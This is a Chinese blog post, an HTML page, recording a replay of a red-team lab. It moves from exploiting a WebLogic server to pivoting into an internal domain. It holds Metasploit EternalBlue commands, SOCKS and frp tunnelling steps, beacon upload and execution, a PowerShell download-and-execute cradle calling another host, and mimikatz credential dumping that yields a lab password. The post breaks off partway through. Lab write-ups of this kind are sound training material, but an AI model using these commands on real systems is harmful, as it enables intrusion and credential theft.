<!DOCTYPE html><html lang="en" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png"><link rel="icon" href="/img/fluid.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="author" content="CDxiaodong"><meta name="keywords" content=""><meta name="description" content="从外网 Weblogic 打进内网，再到约束委派接管域控(复现)靶场官方：渗透攻击红队（微信公众号） https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzkxNDEwMDA4Mw&#x3D;&#x3D;&amp;mid&#x3D;2247488950&amp;idx&#x3D;1&amp;sn&#x3D;48d93f1fac38eae99cc4e78474eb557c&amp;chksm&#x3D;c172cfaaf60546bc3f4b"><meta property="og:type" content="article"><meta property="og:title" content="从外网 Weblogic 打进内网，再到约束委派接管域控205359"><meta property="og:url" content="http://example.com/%E4%BB%8E%E5%A4%96%E7%BD%91%20Weblogic%20%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7205359.html"><meta property="og:site_name" content="CD_blog"><meta property="og:description" content="从外网 Weblogic 打进内网，再到约束委派接管域控(复现)靶场官方：渗透攻击红队（微信公众号） https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzkxNDEwMDA4Mw&#x3D;&#x3D;&amp;mid&#x3D;2247488950&amp;idx&#x3D;1&amp;sn&#x3D;48d93f1fac38eae99cc4e78474eb557c&amp;chksm&#x3D;c172cfaaf60546bc3f4b"><meta property="og:locale" content="en_US"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="c:\Users\e"><meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLialJ6FhvuRV0FEM47XO6pZQB03yQiaiaficd1xkP4IkuNGu4ES7elEz7Wg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201165829111.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201171644695.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201172138319.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201172809091.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201181632862.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201183329083.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201183334564.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201194201408.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201194617548.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201195017882.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201195805667.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200102319.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200125464.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200809694.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200817177.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201201127547.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201201537348.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201203619660.png"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201204022128.png"><meta property="article:published_time" content="2021-12-01T15:20:00.000Z"><meta property="article:modified_time" content="2023-02-20T10:30:20.000Z"><meta property="article:author" content="CDxiaodong"><meta property="article:tag" content="学习笔记"><meta property="article:tag" content="Hexo"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="c:\Users\e"><meta name="referrer" content="no-referrer-when-downgrade"><title>从外网 Weblogic 打进内网，再到约束委派接管域控205359 - CD_blog</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/mac.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var dntVal,CONFIG={hostname:"example.com",root:"/",version:"1.9.4",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!1,follow_dnt:!0,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null,path:"window.location.pathname",ignore_local:!1}},search_path:"/local-search.xml"};CONFIG.web_analytics.follow_dnt&&(dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on")))</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>CD_blog</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> <span>Home</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> <span>Archives</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> <span>Categories</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> <span>Tags</span></a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> <span>About</span></a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> <span>Links</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/default.png) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="从外网 Weblogic 打进内网，再到约束委派接管域控205359"></span></div><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2021-12-01 23:20" pubdate>December 1, 2021 pm</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 9.7k words </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 81 mins</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 style="display:none">从外网 Weblogic 打进内网，再到约束委派接管域控205359</h1><div class="markdown-body"><h1 id="从外网-Weblogic-打进内网，再到约束委派接管域控-复现"><a href="#从外网-Weblogic-打进内网，再到约束委派接管域控-复现" class="headerlink" title="从外网 Weblogic 打进内网，再到约束委派接管域控(复现)"></a>从外网 Weblogic 打进内网，再到约束委派接管域控(复现)</h1><p>靶场官方：渗透攻击红队（微信公众号）</p><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247488950&idx=1&sn=48d93f1fac38eae99cc4e78474eb557c&chksm=c172cfaaf60546bc3f4bfee09181c0f3f07b0c8ba5e9d9a9a0ee92ffc734aff8fe94acb2967c&mpshare=1&scene=23&srcid=1108Dj1vgEkUTeAGMQSHtdZu&sharer_sharetime=1636354180149&sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd">https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&amp;mid=2247488950&amp;idx=1&amp;sn=48d93f1fac38eae99cc4e78474eb557c&amp;chksm=c172cfaaf60546bc3f4bfee09181c0f3f07b0c8ba5e9d9a9a0ee92ffc734aff8fe94acb2967c&amp;mpshare=1&amp;scene=23&amp;srcid=1108Dj1vgEkUTeAGMQSHtdZu&amp;sharer_sharetime=1636354180149&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd</a></p><h2 id="0x01-靶场配置"><a href="#0x01-靶场配置" class="headerlink" title="0x01 靶场配置"></a>0x01 靶场配置</h2><p>攻击机1：win10 192.168.0.193</p><p>攻击机2：kali 192.168.0.105</p><p>靶机： 192.168.0.154 weblogic服务器，其他在域内</p><h2 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h2><h3 id="xray扫一下weblogic-有CVE-2020-2551"><a href="#xray扫一下weblogic-有CVE-2020-2551" class="headerlink" title="xray扫一下weblogic    有CVE_2020_2551"></a>xray扫一下weblogic 有CVE_2020_2551</h3><p>直接一把梭，有admin账户且出网</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110180406788.png" srcset="/img/loading.gif" lazyload alt="image-20211110180406788"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110174428216.png" srcset="/img/loading.gif" lazyload alt="image-20211110174428216"></p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110174640624.png" srcset="/img/loading.gif" lazyload alt="image-20211110174640624" style="zoom:200%"><p>query process查看当前进程</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110180816025.png" srcset="/img/loading.gif" lazyload alt="image-20211110180816025"></p><p>可以看到是无AV的，都不需要做免杀</p><p>直接Powershell 上线到 CobaltStrike：</p><p>cs-attack-payload Generator -powshell command生成命令shell</p><p>放入利用工具里执行</p><p>好奇怪 我本机都可以上线，但是发现weblogic服务器就是上不了线，开http上传beacon.exe并运行也不能上线</p><p>后来发现ping不了我的kali（cs服务器)，原来设置到第一层网络去了</p><p>得把kali的桥接模式设成物理机</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110194820326.png" srcset="/img/loading.gif" lazyload alt="image-20211110194820326"></p><p>ok 成功上线</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110195429152.png" srcset="/img/loading.gif" lazyload alt="image-20211110195429152"></p><p>看到改机器有两个网卡</p><p>hashdump下来</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110195709019.png" srcset="/img/loading.gif" lazyload alt="image-20211110195709019"></p><p>既然有第二个网卡，进行域内信息手机</p><p>凸(艹皿艹 )，扫半天没扫出来，才发现我pc靶机没打开（用巨龙拉冬9.0多口探测）</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110201549508.png" srcset="/img/loading.gif" lazyload alt="image-20211110201549508"></p><p>扫到了这个</p><p>巨龙拉冬扫一下龙洞</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110202205165.png" srcset="/img/loading.gif" lazyload alt="image-20211110202205165"></p><p>ms17-010</p><p>端口转发&gt;cs派生给msf</p><p>利用cs自带开个SOCKS端口<img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110202557195.png" srcset="/img/loading.gif" lazyload alt="image-20211110202557195"></p><p>然后msf连接</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">setg Proxies socks<span class="hljs-number">4:192.168.0</span>.<span class="hljs-number">105:7000</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110205943146.png" srcset="/img/loading.gif" lazyload alt="image-20211110205943146"></p><p>attack</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msf6 &gt; setg ReverseAllowProxy <span class="hljs-literal">true</span><br><br>msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue<br><br>msf6 &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><br>msf6 &gt; <span class="hljs-built_in">set</span> rhost 10.10.20.7<br><br>msf6 &gt; <span class="hljs-built_in">run</span><br><br><br></code></pre></td></tr></table></figure><p>打不进去，是因为cs自带的socks的不稳定性</p><p>直接用cs创建msf监听器试一下，然后msf打开监听即可</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_http</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhoat 192.168.0.105</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 1234</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111114245958.png" srcset="/img/loading.gif" lazyload alt="image-20211111114245958"><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111114236102.png" srcset="/img/loading.gif" lazyload alt="image-20211111114236102"></p><p>这里又产生了个误区，这样的派生结果还是进入了10.10.20.12的meterpreter，好家伙之前学的那些ew啥的考自己搭的环境去学都没能真正学到知识，还得是实战配合工具才能学到知识</p><p>用frp建立一个 socks5 隧道试试</p><p>kali配置文件 frps.ini，然后运行：</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111135927103.png" srcset="/img/loading.gif" lazyload alt="image-20211111135927103"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111134358022.png" srcset="/img/loading.gif" lazyload alt="image-20211111134358022"></p><p>之后来到目标跳板机器运行 frpc：</p><p>当然是先上个shell上传frp文件</p><p>放temp文件夹是因为一般都是temp文件夹的权限比较高，当然我们现在是administrator</p><p>当然这里我用的是cs的frp插件</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111140541110.png" srcset="/img/loading.gif" lazyload alt="image-20211111140541110"></p><p>这个插件用起来看不懂咋用，应该是将frpc.ini传到指定文件夹，下面这个框写下这个目录就行</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111142152835.png" srcset="/img/loading.gif" lazyload alt="image-20211111142152835"></p><p>不过我直接将这个插件里面文件夹的exe直接传过去配合之前传的frpc.ini然后</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> frpc.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">c</span> frpc.ini<br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111142720421.png" srcset="/img/loading.gif" lazyload alt="image-20211111142720421"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111142244819.png" srcset="/img/loading.gif" lazyload alt="image-20211111142244819"></p><p>省的麻烦</p><p><img src="C:\Users\e'e't\Desktop\image-20211111142814692.png" srcset="/img/loading.gif" lazyload alt="image-20211111142814692"></p><h3 id="建立好-socks5-隧道后-Metasploit-对其利用拿到-Meterpreter-会话："><a href="#建立好-socks5-隧道后-Metasploit-对其利用拿到-Meterpreter-会话：" class="headerlink" title="建立好 socks5 隧道后 Metasploit 对其利用拿到 Meterpreter 会话："></a>建立好 socks5 隧道后 Metasploit 对其利用拿到 Meterpreter 会话：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; setg Proxies socks5:192.168.0.105:7777<br>msf6 &gt; setg ReverseAllowProxy <span class="hljs-literal">true</span><br>msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue<br>msf6 &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br>msf6 &gt; <span class="hljs-built_in">set</span> rhost 10.10.20.7<br>msf6 &gt; run<br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111144538232.png" srcset="/img/loading.gif" lazyload alt="image-20211111144538232"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111144649356.png" srcset="/img/loading.gif" lazyload alt="image-20211111144649356"></p><p>ok</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111144803194.png" srcset="/img/loading.gif" lazyload alt="image-20211111144803194"></p><p>通过调用 mimikatz 成功抓到其域用户的密码</p><p>load mimikatz</p><p>creds_all</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111145232823.png" srcset="/img/loading.gif" lazyload alt="image-20211111145232823"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111145329988.png" srcset="/img/loading.gif" lazyload alt="image-20211111145329988"></p><p>解一下hash</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Username  <span class="hljs-keyword">Domain</span>   <span class="hljs-keyword">Password</span><br>saul      REDTEAM  <span class="hljs-keyword">admin</span>!@#<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h4 id="中转上线到-CobaltStrike-进行二层内网域渗透-有几种方法"><a href="#中转上线到-CobaltStrike-进行二层内网域渗透-有几种方法" class="headerlink" title="中转上线到 CobaltStrike 进行二层内网域渗透 有几种方法"></a><strong>中转上线到 CobaltStrike 进行二层内网域渗透</strong> 有几种方法</h4><p>1.meterpreter配置端口外带到cs，方法地址如下，不行 进的使meterpreter</p><p><a target="_blank" rel="noopener" href="http://www.caiyuhuan.com/index.php/article/lian_fengdingbin_/132.html">http://www.caiyuhuan.com/index.php/article/lian_fengdingbin_/132.html</a></p><p>2.设置中转（反向代理）</p><p>因为此 Win7 不出网，随后只能通过 CobaltStrike 设置中转：</p><p>这里换了kali：192.168.0.124</p><p>操作：</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111161315991.png" srcset="/img/loading.gif" lazyload alt="image-20211111161315991"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111161308168.png" srcset="/img/loading.gif" lazyload alt="image-20211111161308168"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111161503437.png" srcset="/img/loading.gif" lazyload alt="image-20211111161503437"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111161553739.png" srcset="/img/loading.gif" lazyload alt="image-20211111161553739"></p><p>然后用这个监听器生成一个exe程序，然后用meterpreter的upload上传到10.10.20.7</p><p>然后在用meterpreter调用cmd运行它</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">upload <span class="hljs-regexp">/var/</span>tmp<span class="hljs-regexp">/FrpProPlugin-mainfrp0.33可转发至cs/</span>beacon.exe C:\\windows\\system32\<br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211111164206425.png" srcset="/img/loading.gif" lazyload alt="image-20211111164206425"></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">execute -f C:<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>system32\beacon.exe<br></code></pre></td></tr></table></figure><p>或cs创建powershell.ps</p><p>直接merterpreter执行cmd执行powershell</p><p>execute怎么样都上不了线，本地把载荷也传过去，也上不了线</p><h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sas">电脑带不动了：一周学习新思路小插曲：<br>1.chcp 65001后可以使meterpreter摆脱cmd乱码执行cmd命令 no<br><br>2.meterpreter先stuid提权在执行命令试试  no<br><br>3.试试那个wblogic靶场可不可以放个c2.exe到10.10.20.7 看下能不能上线<br><br>4.看看10.10.20.7能不能出网，能出网的话直接反向连接到cs服务器<br><br>5.或者直接跳过这个上线阶段，通过meterpreter进行域渗透<br><br>6.https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==<span class="hljs-variable">&amp;mid</span>=2247494697<span class="hljs-variable">&amp;idx</span>=1<span class="hljs-variable">&amp;sn</span>=fe344059f859c43f6c9621aafd82f4aa<span class="hljs-variable">&amp;chksm</span>=cf4e6348f839ea5e10ccac6529e6097545b8087d1302d7a148467436f7ab123b01724ac2464d<span class="hljs-variable">&amp;mpshare</span>=1<span class="hljs-variable">&amp;scene</span>=23<span class="hljs-variable">&amp;srcid</span>=1118HRmMzE7nYwTFY8HsvrF4<span class="hljs-variable">&amp;sharer_sharetime</span>=1637199481433<span class="hljs-variable">&amp;sharer_shareid</span>=d6f91fc924ad833bb5231d972b990ef9#rd<br><br>cs配合msf的别的方法（利用meterpreter）<br><br>7.在上传frp把它代理出来<br>8.将cs载荷带进内网<br></code></pre></td></tr></table></figure><p>ok 内存条换了，继续</p><p>1方法和2方法是我直接再10.10.20.7放中转后的payload并运行都不能上线，所以这些也没用</p><p>3方法因为c2对二层网络没用，所以这不算是方法</p><p>4方法因为目标不能出网，所以不行</p><p>5方法暂时不管</p><p>这里用6试试</p><p>因为拿到了，meterpreter，试试创建钓鱼站点并使靶机运行poweshell连接上线</p><p>这里在CS中利用Attacks-&gt; Web Drive-by -&gt; Scripted Web Delivery 来部署一个Payload分发站点：</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121165837437.png" srcset="/img/loading.gif" lazyload alt="image-20211121165837437"></p><p>主机地址和端口就是钓鱼站点，因为我们看了内网中转监听，把主机地址 和监听器都换成</p><p>10.10.20.12试试</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121165212413.png" srcset="/img/loading.gif" lazyload alt="image-20211121165212413"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell.exe -nop -w <span class="hljs-keyword">hidden</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.20.12:80/a&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121170132881.png" srcset="/img/loading.gif" lazyload alt="image-20211121170132881"></p><p>不行</p><p>后来用靶机ping一下10.10.20.12发现ping不通&#x3D; &#x3D;</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121170314353.png" srcset="/img/loading.gif" lazyload alt="image-20211121170314353"></p><p>但是我们msf用10.10.20.12可以打进10.10.20.7，但是10.10.20.7ping不通10.10.20.12</p><p>这个应该使防火墙设置原因，和其它无关</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121172451306.png" srcset="/img/loading.gif" lazyload alt="image-20211121172451306"></p><p>可以看到两个权限不一样</p><p>meterpreter运行cd c:\users\saul\desktop</p><p>dir</p><p>beacon.exe试一下</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121173403553.png" srcset="/img/loading.gif" lazyload alt="image-20211121173403553"></p><p>看下cs还是不能上线</p><p>7.frp代理</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211121180229882.png" srcset="/img/loading.gif" lazyload alt="image-20211121180229882"></p><p>好的 还是不行。原来是没有搭建域环境，累了</p><p>先整其他的靶场吧</p><p>好了 其他靶场整完额，先改一下这些虚拟机的dns和ip</p><p>第一层192.168.0</p><p>第二层10.10.20</p><p>第三层10.10.10</p><p>10.10.20.7 